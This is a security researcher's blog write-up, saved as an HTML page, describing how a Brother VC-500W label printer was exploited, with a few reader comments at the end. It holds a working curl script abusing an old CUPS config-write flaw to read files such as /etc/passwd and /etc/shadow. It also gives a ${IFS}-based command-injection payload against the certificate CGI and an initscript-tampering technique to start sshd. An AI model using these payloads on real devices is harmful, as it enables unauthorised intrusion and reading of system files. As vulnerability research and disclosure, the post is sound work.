<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://sdomi.pl/weblog/20-pwning-a-labelmaker/">Original</a>
    <h1>Pwning a Brother labelmaker, for fun and interop</h1>
    
    <div id="readability-page-1" class="page"><div><h3>Pwning a Brother labelmaker, for fun and interop!</h3>
<p>If you want <b>just</b> the exploit: <a href="https://git.sakamoto.pl/domi/zinkpwn">here&#39;s the repo</a>! &lt;3</p>
<hr/>

<p>I walk into the bedroom, hearing curses directed vaguely towards computers. My girlfriend is, figuratively, trying to beat a small white box into submission. I come closer, see that it&#39;s a printer, semi-jokingly say &#34;I&#39;m SO glad that it&#39;s not my problem!&#34;, and turn right back.</p>

<p>Exiting the room, I&#39;m having second thoughts. I guess that I do want some pain today after all.</p>

<p><img src="https://sdomi.pl/weblog/20-pwning-a-labelmaker/img/cover.jpg" alt="one of the original winnie the pooh sketches. pooh is looking at a label printer. it&#39;s labeled in a monospace font: Oh, Bother... you fell so low"/></p><p>Our main character is a Brother-branded VC-500W. When installing the printer, I learn that it&#39;s exposing a downright medieval version of CUPS. It&#39;s an experience similar to taking out an old Android phone out of a drawer and being astonished at how dated the UI looks. Do <i>you</i> remember that CUPS had this atrocious gradiented navbar?</p>

<p><img src="https://sdomi.pl/weblog/20-pwning-a-labelmaker/img/1.png"/>
<small>Picture 1 - the cups 1.6.x experience. dark theme, making it even worse, sponsored by darkreader</small></p><p>This has ticked off something in my brain that immediately made me want to dig deeper, because... a brand new device? Shipping with a 2012 build of CUPS? Something&#39;s fishy.</p>

<h3>It&#39;s a lot worse, actually</h3>

<p>Initial setup consisted of clicking through a wizard on a separate web server with some CGI glue in the back.</p>

<p><img src="https://sdomi.pl/weblog/20-pwning-a-labelmaker/img/2.png"/>
<small>Picture 2 - Brother&#39;s equally dated setup page. take note of the copyright date</small></p><p>During the process I&#39;ve seen a few things which stuck out as kind of weird, like... a very long GET request for connecting to a specified WiFi network:</p>

<p><code>http://192.168.247.17/wificonfig?page=4&amp;
	password=bWFkZXVsb29rISEK&amp;
	number=01&amp;
	Address=D6%3A01[snip]&amp;
	ESSID=[snip]&amp;
	Encryption_key=on&amp;
	IE0_label=WPA+Version+1&amp;
	IE0_Group_Cipher=CCMP&amp;
	IE0_Pairwise_Ciphers=CCMP&amp;
	IE0_Authentication_Suites=PSK&amp;
	IE1_label=[snip]&amp;
	IE1_Group_Cipher=CCMP&amp;
	IE1_Pairwise_Ciphers=CCMP&amp;
	IE1_Authentication_Suites=PSK&amp;
	Quality=100%2F100&amp;
	selected_ap=[snip]+(100%2F100)
</code>
<small>this just screams &#34;oooo do command injection oooo i&#39;m not sanitized&#34;</small></p><p>But I ignored them for now, and pressed on. I checked our mikrotik to see what lease the printer got from the DHCP server, and...</p>

<p><img src="https://sdomi.pl/weblog/20-pwning-a-labelmaker/img/3.png"/>
<small>Picture 3 - some spicy system details, as randomly discovered in mikrotik&#39;s DHCP leases section</small></p><p><b>Excuse me?</b> I actually didn&#39;t notice the whole string at first, only later when closing excess windows. I was left dumbfounded at the sight: There&#39;s a CUPS version that&#39;s 10+ years old, Linux kernel almost old enough to drink, all of that <strike>running</strike> crawling on an ARMv5. On a device that&#39;s still in production, which you can buy <b>right now</b>.</p>

<p>Now I <b>had to</b> investigate.</p>

<hr/>

<p>Some initial recon consisted of searching for the device online, to see if anyone has attempted to hack it already. The only result I found was <a href="https://github.com/unitof/brother-vc-500w-hacking">this github repo</a>, which provided some good surface-level info, mostly with regards to where they host the firmware. Turns out that the upgrade packages are in <span>.tgz.gpg</span> format, which... doesn&#39;t tell me much, but still manages to inflict mental pain. I had no use for those right now anyways, but they will surely come in handy later.</p>




<p>Furthermore, I had a quick search for CUPS vulns around this vintage. Turns out that my version is the last one to be vulnerable to an <a href="https://forums.gentoo.org/viewtopic-t-988142-view-previous.html">Arbitrary File Read/Write</a> vulnerability (often miscredited to CVE-2012-5519). With some <span id="n">Copy as cURL<sup><a href="#note">1</a></sup></span> magic, I prepared myself a script:

<span>
	<span>#1</span></span>
</p>

<p><code>#!/bin/bash
if [[ ! &#34;$1&#34; ]];
    echo &#34;usage: $0 <file>&#34;
fi

curl &#39;http://192.168.247.17:631/admin/&#39; -X POST \
    -H &#39;Content-Type: application/x-www-form-urlencoded&#39; \
    -H &#39;Cookie: org.cups.sid=1862ff74a0c01dd0fb444934e7e67e05&#39; \
    --data-raw &#39;org.cups.sid=1862ff74a0c01dd0fb444934e7e67e05&amp;OP=config-server&amp;CUPSDCONF=LogLevel+debug%0D%0ASystemGroup+root%0D%0AGroup+3003%0D%0AServerAlias+*%0D%0A%23+Allow+remote+access%0D%0APort+631%0D%0AListen+%2Fvar%2Frun%2Fcups%2Fcups.sock%0D%0ABrowsing+On%0D%0ABrowseOrder+allow%2Cdeny%0D%0ABrowseAllow+all%0D%0ABrowseLocalProtocols+all%0D%0ABrowseWebIF+No%0D%0AMaxJobs+8%0D%0AMaxClients+5%0D%0AMaxLogSize+5000000%0D%0APreserveJobFiles+No%0D%0APreserveJobHistory+Yes%0D%0ADefaultAuthType+Basic%0D%0ADefaultEncryption+Required%0D%0AWebInterface+Yes%0D%0APageLog+%2F&#39;&#34;$1&#34;&#39;%0D%0A%3CLocation+%2F%3E%0D%0A++%23+Allow+remote+administration...%0D%0A++Order+allow%2Cdeny%0D%0A++Allow+all%0D%0A%3C%2FLocation%3E%0D%0A%3CLocation+%2Fadmin%3E%0D%0A++%23+Allow+remote+administration...%0D%0A++Order+allow%2Cdeny%0D%0A++Allow+all%0D%0A%3C%2FLocation%3E%0D%0A%3CLocation+%2Fadmin%2Fconf%3E%0D%0A++%23+Allow+remote+access+to+the+configuration+files...%0D%0A++Order+allow%2Cdeny%0D%0A++Allow+all%0D%0A%3C%2FLocation%3E%0D%0A%3CPolicy+default%3E%0D%0A++JobPrivateAccess+default%0D%0A++JobPrivateValues+default%0D%0A++SubscriptionPrivateAccess+default%0D%0A++SubscriptionPrivateValues+default%0D%0A++%3CLimit+All%3E%0D%0A++++Order+allow%2Cdeny%0D%0A++++Allow+all%0D%0A++%3C%2FLimit%3E%0D%0A%3C%2FPolicy%3E%0D%0A%3CPolicy+authenticated%3E%0D%0A++JobPrivateAccess+default%0D%0A++JobPrivateValues+default%0D%0A++SubscriptionPrivateAccess+default%0D%0A++SubscriptionPrivateValues+default%0D%0A++%3CLimit+All%3E%0D%0A++++Order+allow%2Cdeny%0D%0A++++Allow+all%0D%0A++%3C%2FLimit%3E%0D%0A%3C%2FPolicy%3E%0D%0A&amp;SAVECHANGES=Save+Changes&#39; &gt;/dev/null
# sorry for this being so long, i have no way to format it sanely x.x

until curl -s http://192.168.247.17:631/admin/log/page_log; do
	:
done
</file></code>
<small>exp.sh, a generic script to fetch any file through the CUPS vuln | this field scrolls</small></p><p>The PoC I found used the <span>ErrorLog</span> directive, which appends a lot of garbage to the files. During my tests, I accidentally did that to my <span>/etc/passwd</span>; Thankfully, because CUPS doesn&#39;t truncate the file, no harm was done. I later found that the same effect can be achieved using <span>PageLog</span>, which leaves the files <b>almost</b> unhurt. We&#39;ll get to that &#34;almost&#34; in a bit.</p>

<p><code>root:x:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:100:sync:/bin:/bin/sync
mail:x:8:8:mail:/var/spool/mail:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
operator:x:37:37:Operator:/var:/bin/sh
haldaemon:x:68:68:hald:/:/bin/sh
dbus:x:81:81:dbus:/var/run/dbus:/bin/sh
ftp:x:83:83:ftp:/home/ftp:/bin/sh
nobody:x:99:99:nobody:/home:/bin/sh
sshd:x:103:99:Operator:/var:/bin/sh
default:x:1000:1000:Default non-root user:/home/default:/bin/sh
</code>

<small>passwd, with trailing garbage removed for readability</small></p><p>Unfortunately, <span>/etc/passwd</span> doesn&#39;t tell us anything especially interesting. I also pulled <span>/etc/shadow</span>, but it didn&#39;t have any password hashes. <span>/bin/sh</span> was more fruitful:</p>

<p><code>domi@zork:~/projects/bro$ file sh
sh: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
domi@zork:~/projects/bro$ strings sh | grep -i busy
	-r	Try to remount devices as read-only if mount is busy
busybox
Usage: busybox [function] [arguments]...
   or: busybox --list[-full]
	BusyBox is a multi-call binary that combines many common Unix
	link to busybox for each function they wish to use and BusyBox
BusyBox v1.19.4 (2018-05-14 11:11:59 EDT)
crond (busybox 1.19.4) started, log level %d
anonymous:busybox@
syslogd started: BusyBox v1.19.4
%s busy - remounted read-only
fsck (busybox 1.19.4, 2018-05-14 11:11:59 EDT)
</code></p><p>As I expected, it was an ancient version of busybox. I thought about manipulating <span>ErrorLog</span> to leverage busybox&#39;s <span>nc</span> and append myself a remote shell to one of the initscripts, but I decided to check out our friends in CGI land first.</p>

<h3>Vendor&#39;s delight</h3>

<p>After the initial setup, the utility expands to provide some additional settings. We can rename the shared printer (no injections here, sadly), and... set up custom TLS certs?</p>

<p><img src="https://sdomi.pl/weblog/20-pwning-a-labelmaker/img/4.png"/>
<small>Picture 4 - you see that right, we have multiple input boxes AND two file upload forms!</small></p><p>I quickly found that using <span>$()</span>, <span>``</span>, or even just <span>;</span> in any of the input fields can lead to code execution.</p>

<p><code>rm generated.csr
wget http://192.168.247.17/generated.csr
cat generated.csr | openssl req -noout -text
</code>

<small>small script to get the output; downloads a CSR and parses it with OpenSSL</small>

<img src="https://sdomi.pl/weblog/20-pwning-a-labelmaker/img/5.png"/>
<small>Picture 5 - whoops. guess i&#39;m root</small></p><p>It&#39;s worth noting that finding this wasn&#39;t endgame just yet. My character set was quite limited, which made it really hard to start a reverse shell. Through trial and error, I found out that I couldn&#39;t use slashes (oof.) and spaces (OOF.) - but dollar signs and curly braces worked just fine.</p>

<h3>env my beloved</h3>

<p>My favourite trick when I can&#39;t use a certain character in an exploit is to step back, and figure out what we already have. A lot of the time, you can find just what you need in <span>$PS1</span> or some other common environment variable. For my purpose, <span>$IFS</span> (the inner-field separator! your shell likely uses this for dividing text into indicies in loops and such) worked perfectly. I used it to insert whitespace between parameters.</p>

<p><code>./generic.sh &#39;http://192.168.247.17/cgi-bin/certmgr/generate_request?&#39;\
&#39;C=AT&amp;&#39;\
&#39;ST=b&amp;&#39;\
&#39;L=d&#34;$(head${IFS}-n1${IFS}/etc/passwd|cat)&#34;&amp;&#39;\
&#39;O=asdf&amp;&#39;\
&#39;OU=meow&amp;&#39;\
&#39;CN=uwu&amp;&#39;\
&#39;emailAddress=ja%40sdomi.pl&amp;&#39;\
&#39;Generate=Generate&#39;
</code>

<small>cat abuse to test if pipes work OK; `d` to ensure the param is never empty</small></p><p>At some point, I messed up. Or so I thought - my exploit still worked OK, but many things on the admin page were empty. I suspected that I broke something with one of the requests, so I rebooted the device. That turned out to be a grave mistake, since after the reboot, the CGI admin interface wouldn&#39;t start, and CUPS was working only partially (<span>Administration</span> page would return 500). Oops.</p>

<h3>Back to the previous exploit</h3>

<p>The last command I ran was trying to copy <span>/etc/passwd</span> into a different location, to see if the other place was writable. I suspected that I messed something up and damaged <span>/etc/passwd</span>, which lead me into an hour-long rabbithole to repair it.</p>

<p>Hypothesis: <span>passwd</span> is now garbage, but I can use the vulnerability in CUPS to recreate it, right? When retrieving <span>/etc/passwd</span> through <span>PageLog</span>, it seemed to be some random binary file, so this sounded at least vaguely plausible. Unfortunately, an hour in, I figured out that my previous CUPS exploit stopped working - the config file wasn&#39;t being written anymore.</p>

<p>I dug deeper. CUPS apparently includes not one, but <b>two</b> different ways to edit the config - one through a form POST request to <span>/admin/</span> (which didn&#39;t work anymore), and another via PUT to <span>/admin/conf/<filename></filename></span>. Additionally, I could do GET the same file to check its contents.</p>

<p>I fetched <span>/etc/passwd</span> again. It had some garbage on the end, but that&#39;s fine (common tools that parse it are REALLY forgiving about the syntax). So, something else must have gone awry...</p>

<p>Having arbitrary write (within the confines of a <span>/etc/cups/</span> - I tried doing the classic <span>/admin/conf/%2e%2e%2fpasswd</span>, but it wasn&#39;t vulnerable), I started thinking how I can abuse that to get RCE and fix what I broke. I thought of rewriting <span>printers.conf</span>, and then using CUPS filters to either gain a shell directly, or gain arbitrary file write to anywhere in the OS and use <b>that</b> to get a shell.</p>

<p>I made a test CUPS environment locally. I spent a few hours trying to get a simple arbitrary file write, but even though I had all the freedom within the CUPS config, I couldn&#39;t get it to work. I finally gave up on trying to use filters in my exploit chain - most likely, I could get something through them, but I lack a good enough understanding of CUPS, and I don&#39;t really want to learn more about printers :^)</p>

<p>As a last ditch effort, I went back to my first idea of using <span>ErrorLog</span> for arbitrary file write - I found out that CUPS 1.6.1 improperly parses the URL while logging errors, hence I could turn <span>%0a</span> into a real newline. Neat, but I still need to find a suitable file to exploit...</p>

<h3>S3 bucket full of goods</h3>

<p>You only start to appreciate file listings once you have a vuln that forces you to guess filenames. But what if I could just look at the base image without any restrictions?</p>

<p><img src="https://sdomi.pl/weblog/20-pwning-a-labelmaker/img/6.png"/>
<small>Picture 6 - how nice of them, they left the listing on!</small></p><p>The GH repo I found at the very beginning gave a link to a file under <span>http://cdn.zinkapps.com/</span>. Looks like requesting <b>just</b> / gives a full file listing, at least as of 2024-06-29. There are some meta files on the very top, then elements of a web UI, some logs (???) and finally lots of <span>.tgz.gpg</span> files. The <span>.gpg</span> extension seems to be a fake - according to <span>file</span>, those files are just <span>openssl enc&#39;d</span>. This makes them easier to encrypt and decrypt, <b>but</b> unlike GPG, the keys are symmetric; if the &#34;decryption&#34; key is found, it would be trivial to make our own upgrade packages.</p>

<p><img src="https://sdomi.pl/weblog/20-pwning-a-labelmaker/img/7.png"/>
<small>Picture 7 - an astute reader may notice that the last file is not like the others</small></p><p>Still, I <i>probably</i> would need to reverse one of the native binaries to find the key. Fortunately, luck was on my side! A bunch of those files were uploaded both in <span>.tgz.gpg</span> and plain <span>.tgz</span> form. Oops?</p>

<h3>Let&#39;s explore!</h3>

<p>I fetched a file named <span>zinkupgrade-latest.tgz</span>, last modified in May of 2021. It&#39;s available <a href="https://web.archive.org/web/20240630170136im_/http://cdn.zinkapps.com/zinkupgrade-latest.tgz">here</a> if you want to play along at home.</p>

<p>The system is a custom buildroot environment, with a... peculiar selection of software. They&#39;ve embedded busybox and microperl to cut on size, but then used full versions of OpenSSH, OpenSSL and CUPS. I can only assume that this project has been hot-potatoed through many underpaid engineers, and this does seem to track with what I found digging through the files.</p>

<p><code># Check hardware id nibble.
if devmem 0xf0000ede | grep &#39;[8A].$&#39; &gt; /dev/kmsg
then
  MODEL=wedge
  # Zink electronics driver module.
  insmod /etc/zbe_printer_W.ko
elif devmem 0xf0000ede | grep &#39;[9].$&#39; &gt; /dev/kmsg
then
  MODEL=turbob
  insmod /etc/zbe_printer_T.ko
fi
</code>
<small>an excerpt from /etc/init.d/S91zink</small></p><p>Initscripts mention devices named &#34;Wedge&#34; and &#34;Turbob&#34;, some config files also are dedicated for &#34;hAppy&#34;. Searching for the last one leads me to zink.com...</p>

<p><img src="https://sdomi.pl/weblog/20-pwning-a-labelmaker/img/8.png"/>
<small>Picture 8 - a grim capitalist hellscape courtesy of zink.com</small></p><p>Oh, bother. You fell so low. Looks like zink is the OEM here, and Brother is just slapping a logo and some branding into the mix. Shameful!</p>

<p>Looking at the review section on <a href="https://www.amazon.com/product-reviews/B00EDCZKJ2/">my least favourite e-commerce site named after a rain forest</a>, first reviews originate from around 2015. I&#39;m not sure if zink was licensing this printer from the very beginning, or if they started later because it wasn&#39;t selling - but it seems that they have one specific design and they&#39;re happy to milk it for as long and as cheap as possible.</p>

<hr/>

<p>Aaaanyways. After I finished pondering about capitalism, I settled upon <span>S91zink</span> as the file I&#39;d append my commands to. I set the <span>ErrorLog</span> file to <span>/etc/init.d/S91zink</span>, and called a non-existant URL <span>http://192.168.247.17:631/%0a/usr/sbin/sshd%0a</span>. Just to be in the clear, I reverted <span>ErrorLog</span> to the default, and rebooted the printer.</p>

<p>...It never started back up. I was dumbfounded, but it was already dawn, so I  called it a night. Next day, I&#39;d have to find UART to unbrick it.</p>

<h3>Disassembly</h3>

<p><small>This section contains physical details about the device;</small></p></div><p>Great post, fantastic walk-through.</p><p>Hulu hell. With an OS image that badly put together, why even bother with authentication in the first place? That seems like a lot of work for something that effectively allows unrestricted access with an easy bypass, not to mention more holes than Swiss cheese.

I know not to expect a lot from this industry (that&#39;s precisely how the phrase you mentioned above, &#39;The S in IoT stands for security&#39;, came to be, after all!), but this is a new low for an industry plagued with security issues.</p><p>excellent read, refreshing morning lecture. many thanks! love the font face here. is it vga 80x25?</p><p>I plugged my Brother label printer in and my LinuxMint automatically worked with it. No setup needed.</p></div>
  </body>
</html>
